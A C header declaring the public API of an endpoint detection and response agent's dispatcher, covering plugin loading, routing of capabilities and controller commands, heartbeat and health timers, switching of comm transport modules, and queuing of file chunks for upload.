#ifndef EDR_DISPATCHER_H
#define EDR_DISPATCHER_H

/*
 * edr_dispatcher.h — Public API for the EDR communication dispatcher.
 *
 * The dispatcher is the only component the agent main() and controller
 * command handler talk to. It owns:
 *   - Plugin registry (load / unload / enumerate)
 *   - Capability routing table (map capability → best available plugin)
 *   - Command demultiplexer (map command_id string → interface function)
 *   - Heartbeat and health timer loops
 */

#include "edr_types.h"
#include "edr_plugin.h"
#include "edr_interfaces.h"

#ifdef __cplusplus
extern "C" {
#endif

/* Opaque dispatcher handle. */
typedef struct edr_dispatcher edr_dispatcher_t;

/* -------------------------------------------------------------------------
 * Dispatcher configuration — supplied once at init time.
 * -------------------------------------------------------------------------*/
typedef struct {
    edr_agent_identity_t identity;

    /* Controller endpoint — passed to each loaded comm plugin. */
    edr_endpoint_t controller_endpoint;

    /* Directory the dispatcher scans for plugin DLLs at startup.
     * NULL = do not auto-load; caller must call edr_dispatcher_load_plugin(). */
    const char *plugin_dir;

    /* Heartbeat interval. 0 = use plugin default (typically 30 s). */
    uint32_t heartbeat_interval_ms;

    /* Health report interval. 0 = disable automatic health reporting. */
    uint32_t health_report_interval_ms;

    /* Max CPU % and RSS the dispatcher will allow any single plugin to use
     * before throttling it. 0 = no limit. */
    float    max_plugin_cpu_percent;
    uint64_t max_plugin_mem_bytes;

    /* Logger — if NULL, dispatcher writes to stderr. */
    edr_log_fn_t log;
} edr_dispatcher_config_t;

/* -------------------------------------------------------------------------
 * Lifecycle
 * -------------------------------------------------------------------------*/

/*
 * edr_dispatcher_create — allocate and return a new dispatcher.
 * Does NOT load any plugins or open network connections.
 * Returns NULL on allocation failure.
 */
edr_dispatcher_t *edr_dispatcher_create(const edr_dispatcher_config_t *cfg);

/*
 * edr_dispatcher_start — load plugins from plugin_dir (if set),
 * bring up comm transport, authenticate, and begin the event loop.
 * Blocks until edr_dispatcher_stop() is called from another thread.
 */
edr_status_t edr_dispatcher_start(edr_dispatcher_t *d);

/*
 * edr_dispatcher_stop — signal the event loop to drain and exit.
 * Flushes pending events and uploads, then shuts down all plugins.
 * Returns after full shutdown.
 */
edr_status_t edr_dispatcher_stop(edr_dispatcher_t *d);

/* edr_dispatcher_destroy — free all resources. Must call stop() first. */
void edr_dispatcher_destroy(edr_dispatcher_t *d);

/* -------------------------------------------------------------------------
 * Plugin registry
 * -------------------------------------------------------------------------*/

/*
 * edr_dispatcher_load_plugin — dynamically load a plugin DLL.
 * path: absolute path to the .so / .dll file.
 * The dispatcher calls edr_plugin_entry, validates the ABI version,
 * calls init(), and registers all advertised capabilities.
 */
edr_status_t edr_dispatcher_load_plugin(edr_dispatcher_t *d,
                                         const char       *path);

/*
 * edr_dispatcher_unload_plugin — gracefully unload a plugin by name.
 * Waits for any in-flight calls to complete before calling shutdown().
 */
edr_status_t edr_dispatcher_unload_plugin(edr_dispatcher_t *d,
                                           const char       *plugin_name);

/* edr_dispatcher_list_plugins — fill out_names with loaded plugin names.
 * cap: capacity of out_names array. Returns actual count. */
uint32_t edr_dispatcher_list_plugins(edr_dispatcher_t *d,
                                      char            (*out_names)[EDR_PLUGIN_NAME_LEN],
                                      uint32_t          cap);

/* -------------------------------------------------------------------------
 * Capability routing — get the best loaded interface for a capability.
 * The dispatcher tries plugins in priority order and falls back automatically.
 * These are used internally; exposed here for testing/introspection.
 * -------------------------------------------------------------------------*/

const edr_iface_comm_t        *edr_get_comm(edr_dispatcher_t *d);
const edr_iface_file_ops_t    *edr_get_file_ops(edr_dispatcher_t *d);
const edr_iface_scan_t        *edr_get_scan(edr_dispatcher_t *d);
const edr_iface_event_t       *edr_get_event(edr_dispatcher_t *d);
const edr_iface_remediation_t *edr_get_remediation(edr_dispatcher_t *d);
const edr_iface_config_t      *edr_get_config(edr_dispatcher_t *d);
const edr_iface_health_t      *edr_get_health(edr_dispatcher_t *d);
const edr_iface_auth_t        *edr_get_auth(edr_dispatcher_t *d);

/* -------------------------------------------------------------------------
 * Command dispatch — called by the inbound message handler.
 *
 * edr_dispatcher_dispatch maps msg->command_id to the correct interface
 * function and invokes it with the parsed payload. The completion callback
 * is responsible for sending the response message back upstream.
 * -------------------------------------------------------------------------*/
edr_status_t edr_dispatcher_dispatch(edr_dispatcher_t   *d,
                                      const edr_message_t *msg,
                                      edr_completion_cb_t  response_cb,
                                      void                *ctx);

/* Register a statically-linked (built-in) plugin without dlopen.
 * Call this before edr_dispatcher_start() to wire in compile-time plugins. */
edr_status_t edr_dispatcher_register_plugin(edr_dispatcher_t      *d,
                                             edr_plugin_entry_fn_t  entry_fn);

/* ─────────────────────────────────────────────────────────────────────────
 * Runtime module switching (for TUI selection)
 * ─────────────────────────────────────────────────────────────────────────*/

/* Communication module info */
typedef struct {
    char name[EDR_PLUGIN_NAME_LEN];
    uint8_t priority;
    int is_active;
    int is_connected;
} edr_comm_module_t;

/* List all loaded comm transport modules */
uint32_t edr_dispatcher_list_comm_modules(edr_dispatcher_t *d,
                                          edr_comm_module_t *out,
                                          uint32_t cap);

/* Switch active comm transport module (with automatic fallback if switch fails) */
edr_status_t edr_dispatcher_switch_comm_module(edr_dispatcher_t *d,
                                               const char *module_name);

/* Get current active comm module name */
const char *edr_dispatcher_get_active_comm_module(edr_dispatcher_t *d);

/* Callback type for VPN module to register message enqueue */
typedef void (*edr_enqueue_msg_cb_t)(const char *msg);

/* Register VPN module's enqueue callback */
void edr_dispatcher_set_enqueue_callback(edr_dispatcher_t *d, edr_enqueue_msg_cb_t cb);

/* Get queued file chunks for sending on next beacon */
uint32_t edr_dispatcher_get_file_chunks(edr_dispatcher_t *d,
                                         char **chunks, uint32_t max_chunks);

#ifdef __cplusplus
}
#endif

#endif /* EDR_DISPATCHER_H */
